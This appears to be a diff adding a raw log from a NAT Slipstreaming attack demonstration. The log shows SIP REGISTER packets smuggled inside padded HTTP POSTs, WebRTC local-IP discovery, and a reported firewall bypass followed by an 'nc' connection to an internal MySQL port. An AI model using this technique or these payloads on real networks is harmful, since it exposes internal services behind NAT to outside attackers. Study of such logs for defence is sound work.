+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa006432056449893964bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------1671377582099643687627480450--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=31 (orig 31), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa006432056449893964bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------43049066921187592792135419957--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=27 (orig 27), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa006432056449893964bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------698364925292763329714804234--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=29 (orig 29), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa006432056449893964bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------1561101412338147701128903682--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=33 (orig 33), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaa006432056449893964bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------166811170412676802751942508313--
+   </i><br>injecting overflowed 2nd packet contents:
+<i>   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0   
+   Via: SIP/2.0/TCP <b><b>1.3.3.13</b></b>:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP   
+   Max-Forwards: 70   
+   Contact:<b> <sip:samy@1.3.3.13:<b>3306</b>;rinstance=v40f3f83b335139c;transport=TCP>   
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>   
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519   
+   Call-ID: aaaaaaaaaaaa006432056449893964bbbbbbZjQ4M2M.   
+   CSeq: 1 REGISTER   
+   Expires: 70   
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE   
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri   
+   User-Agent: samy natpinning v2   
+   Allow-Events: presence, kpml   
+   Content-Length: 0   
+      
+   </i><br>maximizing POST data over port 5060 to force "SIP packet" to begin on packet boundary<br>
+ready to traverse NAT/network/firewall, <b>press button above</b>...<br>stuff padding to fill tcp packet: <b>835 bytes</b><br>beacon received, packet capture lengths: {id:006432056449893964, stuff_bytes:835}<br>using first ip: <b>1.3.3.13</b><br>redirected to http to continue attack with localips in url<br>webrtc acquired ips: <b>1.3.3.13</b><br>created webrtc data channel to obtain local ip over https<br>sending TCP beacon to detect maximum packet size and MTU<br>responding to SYN with maximum segment size TCP option to control data size<br>requesting sniffed packet sizes from server<br>
+)
+
+192.168.1.197 1640255864: Array
+(
+    [C0] => {id:07568644129248768, stuff_bytes:833}
+)
+
+192.168.1.197 1640255910: Array
+(
+    [C9] => 192.168.1.197:3306: It's Working - I bypassed the NAT firewall
+<br><b>connected to 192.168.1.197:3306</b><br>
+<b>attempting to bypass your NAT/firewall</b><br>running: nc -v 192.168.1.197 3306<br><br><b>status: SUCCESS! ip in returned SIP packet is 192.168.1.197</b>, different than what we sent (<b>1.3.3.13</b>), victim NAT rewrote it<br><hr><br>offset=0 (orig 0), received this packet:
+<i>   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@192.168.1.197:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa07568644129248768bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------7818782601417280382953948567--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>new len 1488<br>old len 1515<br>offset same as last time, maybe something in HTTP header changed - adjusting packet length<br>offset=27 (orig 27), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa07568644129248768bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------1999429893753268467155992632--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=27 (orig 27), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa07568644129248768bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------1499988546605321841493456654--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=31 (orig 31), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa07568644129248768bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------169891212518080428781398241263--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=27 (orig 27), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa07568644129248768bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------1913446719494401046284445905--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=29 (orig 29), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa07568644129248768bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------16486093684484394891113158861--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=23 (orig 23), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa07568644129248768bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------66713975450087129373121979--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=27 (orig 27), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa07568644129248768bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------8442851718139960771846379274--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=31 (orig 31), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa07568644129248768bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------150927474419092730141160119312--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=27 (orig 27), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:3306;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa07568644129248768bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------6161719541425436385815876419--
+   </i><br>injecting overflowed 2nd packet contents:
+<i>   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0   
+   Via: SIP/2.0/TCP <b><b>1.3.3.13</b></b>:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP   
+   Max-Forwards: 70   
+   Contact:<b> <sip:samy@1.3.3.13:<b>3306</b>;rinstance=v40f3f83b335139c;transport=TCP>   
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>   
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519   
+   Call-ID: aaaaaaaaaaaaa07568644129248768bbbbbbZjQ4M2M.   
+   CSeq: 1 REGISTER   
+   Expires: 70   
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE   
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri   
+   User-Agent: samy natpinning v2   
+   Allow-Events: presence, kpml   
+   Content-Length: 0   
+      
+   </i><br>maximizing POST data over port 5060 to force "SIP packet" to begin on packet boundary<br>
+ready to traverse NAT/network/firewall, <b>press button above</b>...<br>stuff padding to fill tcp packet: <b>833 bytes</b><br>beacon received, packet capture lengths: {id:07568644129248768, stuff_bytes:833}<br>using first ip: <b>1.3.3.13</b><br>redirected to http to continue attack with localips in url<br>webrtc acquired ips: <b>1.3.3.13</b><br>created webrtc data channel to obtain local ip over https<br>sending TCP beacon to detect maximum packet size and MTU<br>responding to SYN with maximum segment size TCP option to control data size<br>requesting sniffed packet sizes from server<br>
+)
+
